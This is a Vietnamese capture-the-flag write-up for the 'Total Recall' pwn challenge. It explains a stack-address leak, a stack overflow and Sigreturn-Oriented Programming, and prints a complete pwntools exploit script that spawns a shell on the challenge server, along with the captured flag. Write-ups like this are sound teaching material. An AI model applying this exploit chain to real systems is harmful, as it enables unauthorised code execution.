# Total Recall — Writeup

**Thể loại:** Pwn / Reverse Engineering
**Kiến trúc:** x86-64, Linux, viết tay bằng `nasm` + `ld` (syscall-only, không libc)
**Kỹ thuật chính:** Stack overflow → ret2 control-flow hijack → **SROP** (Sigreturn-Oriented Programming)

---

## 1. Khảo sát ban đầu

```
┌──(root㉿kali)-[/home/whoknows/Downloads/total]
└─# checksec --file=./total_recall
RELRO        STACK CANARY    NX           PIE      ...
No RELRO     No canary found NX disabled  No PIE   ...
```

Ba thông tin đáng chú ý:

- **No PIE** → vùng `.text` nằm ở địa chỉ cố định (`0x401xxx` mỗi lần chạy) → địa chỉ các lệnh lấy thẳng từ `objdump` là dùng được.
- **No canary** → tràn stack không bị phát hiện → có thể ghi đè saved RIP.
- **NX disabled** → nghe như "stack chạy được shellcode", nhưng **thực tế không phải vậy** (xem mục 2).

## 2. Vì sao không thể nhét shellcode lên stack?

Thử ngay: đặt shellcode ở đầu buffer rồi cho `ret` nhảy vào đó.

```
leak = 0x7ffe6144fd08
[*] Switching to interactive mode
[*] Got EOF while reading in interactive
[*] Process './total_recall' stopped with exit code -11 (SIGSEGV)
```

Không có một byte output nào (dù shellcode có `write("PWNED")`), chỉ SIGSEGV. Nghĩa là CPU **không fetch nổi instruction đầu tiên** trên stack → trang stack không có quyền execute.

**Vì sao checksec lại báo "NX disabled"?** `checksec` chỉ đọc *program header* trong file ELF (cụ thể là `PT_GNU_STACK`) rồi phán đoán. Binary viết tay bằng `nasm + ld` thường **không có** header này, nên checksec kết luận "không bị cấm". Nhưng người cấp quyền thật cho stack là **kernel**, tại thời điểm nạp process — và trên x86-64 hiện đại, thiếu header **không** đồng nghĩa với được cấp quyền execute; stack vẫn là `rw-`.

> Tóm lại: **`checksec` là phán đoán tĩnh từ file; kernel mới là sự thật lúc chạy.** Có thể xác nhận bằng:
> ```bash
> readelf -lW ./total_recall | grep -i gnu_stack   # thường không in ra gì
> ./total_recall & sleep 0.2; grep stack /proc/$!/maps   # thấy "rw-p" → không execute
> ```

⇒ Hướng "shellcode trên stack" chết. Phải đi đường khác.

## 3. Phân tích disassembly

```
0000000000401000 <.text>:
  401000:  call   0x401016
  401005:  call   0x40104f
  40100a:  mov    rax,0x3c
  401011:  xor    rdi,rdi
  401014:  syscall

  401016:  push   rsp
  401017:  mov    rsi,rsp
  40101a:  mov    rdi,0x1
  401021:  mov    rdx,0x8
  401028:  mov    rax,0x1
  40102f:  syscall              ; write(1, &rsp, 8)
  401031:  pop    rax
  401032:  lea    rsi,[rsp-0x40]
  401037:  mov    rdi,0x0
  40103e:  mov    rdx,0x18
  401045:  mov    rax,0x0
  40104c:  syscall              ; read#1
  40104e:  ret

  40104f:  lea    rsi,[rsp-0x80]
  401054:  mov    rdi,0x0
  40105b:  mov    rdx,0x400
  401062:  mov    rax,0x0
  401069:  syscall              ; read#2
  40106b:  ret
```

### 3.1. Rò rỉ địa chỉ stack

Ở `0x401016`, chương trình `push rsp` rồi `write(1, rsp, 8)` → in ra **8 byte nhị phân chính là giá trị `rsp`** tại thời điểm đó. Địa chỉ này trỏ đúng vào ô **saved RIP** của hàm.

Vì `start` gọi `call 0x401016` rồi `call 0x40104f` **liền nhau**, không có lệnh nào đụng vào `rsp` ở giữa, nên `rsp` khi vào `sub_40104F` **bằng đúng** giá trị `rsp` đã rò rỉ.

Gọi `leak` = giá trị rò rỉ. Khi đó:

| Đại lượng       | Công thức      | Ý nghĩa                                          |
|-----------------|----------------|--------------------------------------------------|
| `leak`          | —              | địa chỉ ô saved RIP (`rsp` lúc vào `sub_40104F`) |
| đầu buffer      | `leak - 0x80`  | nơi byte đầu tiên của payload rơi vào            |
| khung sigframe  | `leak + 0x10`  | nơi kernel đọc frame lúc `rt_sigreturn`          |
| chuỗi `/bin/sh` | `leak + 0x108` | tham số cho `execve`                             |

> Đây là cơ sở để quy mọi địa chỉ trên stack về `leak + offset`. Vì ASLR chỉ **dịch cả khối stack** chứ không đổi khoảng cách giữa các ô, nên `leak` làm gốc tọa độ là hoàn toàn hợp lệ.

### 3.2. Hai lệnh `read` — cái nào tràn được?

Điều kiện để một `read` ghi đè được saved RIP:

```
rdx  >  (khoảng cách từ buffer tới saved RIP)
```

|                           | read#1 (`sub_401016`)           | read#2 (`sub_40104F`)                      |
|---------------------------|---------------------------------|--------------------------------------------|
| Buffer tại                | `rsp - 0x40`                    | `rsp - 0x80`                               |
| Khoảng cách tới saved RIP | `0x40` = 64                     | `0x80` = 128                               |
| Số byte tối đa (`rdx`)    | `0x18` = 24                     | `0x400` = 1024                             |
| So sánh                   | 24 **<** 64                     | 1024 **>** 128                             |
| Kết luận                  | không tràn → chỉ "nuôi" cho qua | **tràn được**, byte thứ 129 chạm saved RIP |

⇒ Offset tới saved RIP là **`0x80` (128) byte**. Vì hàm không có prologue (không có `push rbp`), nên **không cộng thêm 8** cho saved RBP.

## 4. Vì sao phải dùng SROP?

Từ mục 3, ta có thể tràn `read#2` để ghi đè saved RIP và cướp luồng điều khiển bằng `ret`. Nhưng:

- **Không dùng được shellcode** → stack không execute (mục 2).
- **Không dùng được ROP chain kinh điển** → binary syscall-only, quá nhỏ, **không có gadget** kiểu `pop rdi; ret`, `pop rsi; ret` để set từng thanh ghi.
- **Không có sẵn** hàm `execve`/`open`/`read`/`write` trong chương trình.

Điểm sáng: binary **có lệnh `syscall`** ở địa chỉ cố định, và ta **hoàn toàn điều khiển được `rax`**. Ba điều kiện vàng của SROP đều hội đủ:

1. Có một lệnh `syscall` gọi được.
2. Kiểm soát được `rax = 15` (`__NR_rt_sigreturn`).
3. Kiểm soát được `rsp` (biết chính xác nó trỏ đâu nhờ `leak`).

**SROP** (Sigreturn-Oriented Programming, Erik Bosman — Black Hat 2014) lợi dụng dịch vụ `rt_sigreturn` của kernel: kernel đọc một "khung tín hiệu" trên stack và **nạp lại toàn bộ thanh ghi** theo đó. Ta chỉ cần viết một khung giả → điều khiển `rax`, `rdi`, `rip`… cùng lúc trong một lệnh `syscall` duy nhất.

> Mấu chốt: SROP **không cần stack execute**, vì stack chỉ bị **kernel đọc như dữ liệu**, còn "code chạy" vẫn nằm trong `.text` (đã có quyền `x`).

## 5. Xây dựng payload

### 5.1. Đặt `rax = 15` mà không cần gadget

`read` trả về **số byte đã đọc** trong `rax`. Vậy muốn `rax = 15`, chỉ cần gửi **đúng 15 byte** cho một lần `read`.

Ta tái sử dụng chính `read#2` bằng cách nhảy vào `0x401062`:

```
401062:  mov    rax,0x0     ; rax = 0 → syscall kế tiếp là "read"
401069:  syscall            ; read#3 (thừa hưởng rdi/rsi/rdx cũ: read(0, leak-0x80, 0x400))
40106b:  ret
```

Lưu ý: `rdi/rsi/rdx` **vẫn còn nguyên** từ lần `read#2` (`rdi=0`, `rsi=leak-0x80`, `rdx=0x400`), nên không cần set lại. Đó là lý do ta gọi `0x401062` là **`READ_AGAIN`**.

Sau `read#3`, ta gửi 15 byte → `rax = 15`. 15 byte này ghi vào **đầu buffer** (`leak-0x80`), đè lên 15 chữ `'A'` đầu tiên — vô hại vì rất xa khung frame.

### 5.2. Xích hai bước bằng `ret`

Vì `read#3` chạy xong sẽ **rơi xuống** lệnh `ret` tại `0x40106b` chứ không tự gọi `syscall`, ta cần đưa nó tới `0x401069` bằng cách đặt địa chỉ đó vào ô mà `ret` sẽ pop:

```
ret (0x40106b) pop [leak]     → nhảy 0x401062 (READ_AGAIN)   ; syscall với rax=0 → read#3 → rax=15
ret (0x40106b) pop [leak + 8] → nhảy 0x401069 (SYSCALL)      ; syscall với rax=15 → rt_sigreturn
```

Đây là **hai bước điều hướng bằng `ret`**, không phải ROP chain kinh điển (vì không có gadget set thanh ghi nào).

### 5.3. Bố cục payload

```
offset (tính từ đầu buffer) | địa chỉ thật (mốc leak)  | nội dung
0x00 .. 0x7F                | leak-0x80 .. leak-0x01   | 'A' * 128           (đệm tới saved RIP)
0x80 .. 0x87                | leak+0x00 .. leak+0x07   | p64(READ_AGAIN)     ← ô saved RIP (ret#1 pop)
0x88 .. 0x8F                | leak+0x08 .. leak+0x0F   | p64(SYSCALL)        ← (ret#2 pop)
0x90 .. 0x187               | leak+0x10 .. leak+0x107  | bytes(frame)        ← kernel đọc tại đây
0x188 .. 0x18F              | leak+0x108 .. leak+0x10F | "/bin/sh\x00"       ← frame.rdi trỏ tới
```

### 5.4. Giải thích `SigreturnFrame`

```python
frame = SigreturnFrame()
frame.rax = constants.SYS_execve   # 59  → lần syscall kế tiếp chạy execve
frame.rdi = leak + 0x108           # con trỏ tới "/bin/sh"
frame.rsi = 0                      # argv = NULL
frame.rdx = 0                      # envp = NULL
frame.rip = SYSCALL                # sau sigreturn, chạy tiếp ở lệnh syscall
frame.rsp = leak + 0x300           # stack hợp lệ cho tiến trình mới
frame.csgsfs = 0x33                # CS = 0x33 (select code segment 64-bit)
frame.eflags = 0x202
```

Giải thích các con số:

- **`frame.rdi = leak + 0x108`** — đây là địa chỉ của chuỗi `/bin/sh`. Chuỗi được đặt ở offset `0x188` trong buffer, mà buffer bắt đầu tại `leak - 0x80`, nên `(leak - 0x80) + 0x188 = leak + 0x108`.
- **`frame.rip = SYSCALL`** — sau khi `rt_sigreturn` nạp xong thanh ghi, CPU tiếp tục tại lệnh `syscall`. Lúc này `rax = 59` → kernel gọi `execve("/bin/sh", 0, 0)`.
- **`frame.rsp = leak + 0x300`** — `rt_sigreturn` khôi phục **cả `rsp`**, nên phải là một địa chỉ hợp lệ (đã map, ghi được, canh chỉnh 16 byte) và **không đè** lên khung `frame` hay chuỗi `/bin/sh`. Miền `leak-0x80 .. leak+0x380` (vùng `read#2` đã đọc vào) chắc chắn hợp lệ; chọn `leak + 0x300` nằm giữa hai mép an toàn.
- Lưu ý: với `execve` thành công thì kernel tự dựng stack mới cho `/bin/sh`, nên `rsp` này chủ yếu là "bảo hiểm" cho trường hợp `execve` thất bại hoặc khi đổi sang chuỗi ORW.
- **`frame.csgsfs = 0x33`** — một số bản pwntools cũ gộp `CS/GS/FS` vào một field 8 byte tên `csgsfs` (CS ở 16 bit thấp). Không set được `frame.cs` riêng; `ss` thì kernel tự đặt khi trả về user mode.

### 5.5. Dòng `ljust`

```python
payload  = payload.ljust(0x188, b'A')
payload += b'/bin/sh\x00'
```

Đây **không phải** bước "kiểm tra", cũng không thêm byte nào trong trường hợp này (khối trước đã dài đúng `0x80 + 8 + 8 + 0xF8 = 0x188`). Mục đích: **ghim cứng vị trí chuỗi `/bin/sh` tại offset `0x188`** trong buffer, để luôn khớp với con số `frame.rdi = leak + 0x108`. Nói cách khác, `ljust(0x188)` và `frame.rdi = leak + 0x108` là **một cặp ràng buộc**: đổi cái này phải đổi cái kia.

## 6. Script exploit

```python
from pwn import *
import time
context.arch = 'amd64'

# p = process('./total_recall')            # test local trước
p = remote('chal.sunshinectf.games', 26003)

READ_AGAIN = 0x401062   # mov rax,0 ; syscall  -> read lại vào leak-0x80
SYSCALL    = 0x401069   # syscall trần

leak = u64(p.recvn(8))
log.success('leak = %#x' % leak)
p.send(b'A' * 24)                        # nuôi read#1

frame = SigreturnFrame()
frame.rax = constants.SYS_execve         # 59
frame.rdi = leak + 0x108                 # địa chỉ chuỗi "/bin/sh"
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL                      # sau sigreturn -> syscall với rax=59 -> execve
frame.rsp = leak + 0x300                 # stack hợp lệ
frame.csgsfs = 0x33
frame.eflags = 0x202

payload  = b'A' * 0x80                   # đệm tới saved RIP
payload += p64(READ_AGAIN)               # ret#1: gọi lại read, gửi 15 byte -> rax = 15
payload += p64(SYSCALL)                  # ret#2: syscall với rax = 15 -> rt_sigreturn
payload += bytes(frame)                  # khung giả, kernel đọc tại leak+0x10
payload  = payload.ljust(0x188, b'A')
payload += b'/bin/sh\x00'                # tham số cho execve, tại leak+0x108

p.send(payload)
time.sleep(0.5)                          # tránh gói payload và gói 15 byte bị gộp vào 1 read
p.send(b'A' * 15)                        # read#3 trả về 15 -> rax = 15 = __NR_rt_sigreturn

p.interactive()
```

> `time.sleep(0.5)` là bắt buộc: nếu gói 400 byte và gói 15 byte về cùng lúc, `read#2` sẽ nuốt cả hai → `rax` sai và exploit treo.

## 7. Kết quả

```
└─# python 1.py
[+] Opening connection to chal.sunshinectf.games on port 26003: Done
[+] leak = 0x7ffc8fe5e538
[*] Switching to interactive mode
$ ls
flag.txt
$ cat flag.txt
sun{r3caLl_ev3Ry_reGist3r_sR0p}
$
```

**Flag:** `sun{r3caLl_ev3Ry_reGist3r_sR0p}`

## 8. Tổng kết kỹ thuật

| Bước               | Cơ chế                                                                 |
|--------------------|------------------------------------------------------------------------|
| Rò rỉ `leak`       | `sub_401016` in 8 byte = giá trị `rsp` = địa chỉ ô saved RIP           |
| Nuôi read#1        | gửi 24 byte (không tới được saved RIP) → để `start` gọi `sub_40104F`   |
| Tràn read#2        | ghi 0x80 byte đệm + địa chỉ vào saved RIP → cướp `ret`                 |
| Đặt `rax = 15`     | `READ_AGAIN` gọi lại `read`, gửi đúng 15 byte → `rax` = số byte đọc    |
| Gọi `rt_sigreturn` | `ret` thứ hai nhảy tới `syscall` với `rax = 15`                        |
| Nạp thanh ghi      | kernel đọc khung giả trên stack → `rax=59, rdi="/bin/sh", rip=syscall` |
| `execve`           | cùng lệnh `syscall`, giờ `rax = 59` → `/bin/sh`                        |

**Điểm cốt lõi:** không hề có shellcode, cũng không có ROP gadget. Ta chỉ **lập trình lại các thanh ghi bằng dữ liệu**, rồi để **kernel** (`rt_sigreturn`) và **`/bin/sh`** làm phần "thực thi". Stack suốt quá trình vẫn là `rw-` — chưa từng execute.

*(Cái tên "Total Recall" chính là gợi ý: **Re-CALL to `sigreturn`**.)*
